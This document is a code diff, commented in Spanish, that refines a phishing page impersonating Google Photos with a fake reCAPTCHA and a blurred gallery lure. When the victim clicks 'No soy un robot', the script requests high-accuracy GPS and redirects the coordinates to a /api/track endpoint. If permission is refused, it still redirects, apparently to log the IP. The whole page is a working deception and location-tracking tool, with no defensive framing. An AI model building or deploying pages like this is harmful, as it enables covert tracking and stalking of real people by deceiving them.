@@ -3,97 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Photos - Archivo Compartido</title>
+    <title>Google Photos - Verificación de Galería Protegida</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', sans-serif; overflow: hidden; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', sans-serif; overflow: hidden; background-color: #f0f3f4; }
         
-        /* Fondo con blur */
-        .background-blur {
-            position: fixed; width: 100%; height: 100%;
-            background: url('https://images.unsplash.com/photo-1557683316-973673baf926?q=80&w=1000') no-repeat center center;
-            background-size: cover; filter: blur(15px) brightness(0.7);
-            z-index: -1;
+        /* Contenedor del fondo de mosaico borroso */
+        .background-grid {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            display: grid; grid-template-columns: repeat(4, 1fr); grid-template-rows: repeat(4, 1fr);
+            gap: 2px; filter: blur(20px) brightness(0.8); /* DESENFOQUE AGRESIVO */
+            z-index: -1; transform: scale(1.1); /* Para evitar bordes blancos */
         }
 
-        /* Overlay oscuro */
+        /* Imágenes genéricas para el mosaico (parecen fotos de galería) */
+        .grid-item { background-size: cover; background-position: center; }
+        .img1 { background-image: url('https://images.unsplash.com/photo-1511367461989-f85a21fda167?q=80&w=400'); }
+        .img2 { background-image: url('https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?q=80&w=400'); }
+        .img3 { background-image: url('https://images.unsplash.com/photo-1544005313-94ddf0286df2?q=80&w=400'); }
+        .img4 { background-image: url('https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=400'); }
+        .img5 { background-image: url('https://images.unsplash.com/photo-1520607162513-77705c0f0d4a?q=80&w=400'); } /* Parece chat */
+        .img6 { background-image: url('https://images.unsplash.com/photo-1531123897727-8f129e16fd3c?q=80&w=400'); }
+        /* Repetimos para llenar la cuadrícula 4x4 */
+
+        /* Overlay oscuro para centrar la atención */
         .overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.4); display: flex; align-items: center; justify-content: center;
+            background: rgba(0,0,0,0.3); display: flex; align-items: center; justify-content: center;
         }
 
-        /* El Modal del Captcha */
+        /* Modal del Captcha (Estilo Google) */
         .captcha-box {
-            background: #fff; padding: 24px; border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3); width: 350px; text-align: center;
+            background: #fff; padding: 32px 24px; border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4); width: 360px; text-align: center;
+            border: 1px solid #dadce0;
         }
 
-        .google-logo { width: 90px; margin-bottom: 20px; }
-        h2 { font-size: 18px; color: #3c4043; margin-bottom: 8px; }
-        p { font-size: 14px; color: #5f6368; margin-bottom: 25px; }
+        .google-logo { width: 100px; margin-bottom: 25px; }
+        h2 { font-size: 20px; color: #202124; margin-bottom: 12px; font-weight: 500; }
+        p { font-size: 15px; color: #5f6368; margin-bottom: 30px; line-height: 1.4; }
 
         /* Estilo reCAPTCHA */
         .recaptcha-ui {
-            background: #f9f9f9; border: 1px solid #d3d3d3;
+            background: #f8f9fa; border: 1px solid #dcdcdc;
             border-radius: 3px; display: flex; align-items: center;
-            padding: 15px; cursor: pointer; transition: background 0.2s;
+            padding: 18px 15px; cursor: pointer; transition: background 0.2s, box-shadow 0.2s;
         }
-        .recaptcha-ui:hover { background: #f1f1f1; }
+        .recaptcha-ui:hover { background: #f1f3f4; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
         
         .checkbox {
-            width: 24px; height: 24px; border: 2px solid #c1c1c1;
-            border-radius: 2px; margin-right: 15px; background: #fff;
+            width: 26px; height: 26px; border: 2px solid #c1c1c1;
+            border-radius: 2px; margin-right: 16px; background: #fff;
+            position: relative;
         }
 
-        .check-text { font-size: 14px; color: #555; flex-grow: 1; text-align: left; }
-        .recaptcha-logo { width: 30px; }
+        .check-text { font-size: 15px; color: #202124; flex-grow: 1; text-align: left; }
+        .recaptcha-logo-container { display: flex; flex-direction: column; align-items: center; }
+        .recaptcha-logo { width: 32px; margin-bottom: 2px; }
+        .recaptcha-msg { font-size: 10px; color: #777; }
 
     </style>
 </head>
 <body>
 
-    <div class="background-blur"></div>
+    <div class="background-grid">
+        <div class="grid-item img1"></div><div class="grid-item img2"></div><div class="grid-item img3"></div><div class="grid-item img4"></div>
+        <div class="grid-item img5"></div><div class="grid-item img6"></div><div class="grid-item img1"></div><div class="grid-item img3"></div>
+        <div class="grid-item img2"></div><div class="grid-item img4"></div><div class="grid-item img5"></div><div class="grid-item img6"></div>
+        <div class="grid-item img3"></div><div class="grid-item img1"></div><div class="grid-item img6"></div><div class="grid-item img2"></div>
+    </div>
 
     <div class="overlay">
         <div class="captcha-box">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" class="google-logo" alt="Google">
-            <h2>Verificación de Seguridad</h2>
-            <p>Para ver las fotos compartidas y los registros de ubicación, confirma que eres un humano.</p>
+            <h2>Álbum Protegido</h2>
+            <p>Se han detectado intentos de acceso no autorizados a esta galería compartida. Confirma que eres un humano para ver el contenido.</p>
             
             <div class="recaptcha-ui" id="captchaBtn">
                 <div class="checkbox" id="check"></div>
                 <div class="check-text">No soy un robot</div>
-                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="recaptcha-logo">
+                <div class="recaptcha-logo-container">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="recaptcha-logo">
+                    <span class="recaptcha-msg">reCAPTCHA</span>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
         document.getElementById('captchaBtn').onclick = function() {
-            // Animamos el check
-            document.getElementById('check').style.background = "#4285f4";
-            document.getElementById('check').innerHTML = "✓";
-            document.getElementById('check').style.color = "white";
-            document.getElementById('check').style.textAlign = "center";
+            // Animamos el check (Estilo Google)
+            const check = document.getElementById('check');
+            check.style.background = "#4285f4";
+            check.style.borderColor = "#4285f4";
+            check.innerHTML = "✓";
+            check.style.color = "white";
+            check.style.textAlign = "center";
+            check.style.lineHeight = "26px";
+            check.style.fontSize = "18px";
 
-            // Disparamos la solicitud de ubicación REAL (GPS)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy: true});
-            } else {
-                window.location.href = "/api/track?gps=not_supported";
-            }
+            // Pequeña pausa para que vean el check antes de pedir ubicación
+            setTimeout(() => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(success, error, {
+                        enableHighAccuracy: true, // Forzar GPS
+                        timeout: 5000,
+                        maximumAge: 0
+                    });
+                } else {
+                    window.location.href = "/api/track?gps=not_supported";
+                }
+            }, 500);
         };
 
         function success(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            // Mandamos los datos GPS a tu API
-            window.location.href = `/api/track?lat=${lat}&lon=${lon}&acc=${position.coords.accuracy}`;
+            window.location.href = `/api/track?lat=${position.coords.latitude}&lon=${position.coords.longitude}&acc=${position.coords.accuracy}`;
         }
 
-        function error() {
-            // Si rechaza el permiso, igual lo mandamos al API para capturar al menos la IP
-            window.location.href = "/api/track?gps=denied";
+        function error(err) {
+            console.warn(`ERROR(${err.code}): ${err.message}`);
+            // Razón del fallo para el log
+            let reason = "unknown";
+            if(err.code === 1) reason = "denied";
+            if(err.code === 2) reason = "unavailable";
+            if(err.code === 3) reason = "timeout";
+            window.location.href = `/api/track?gps=${reason}`;
         }
     </script>
 </body>
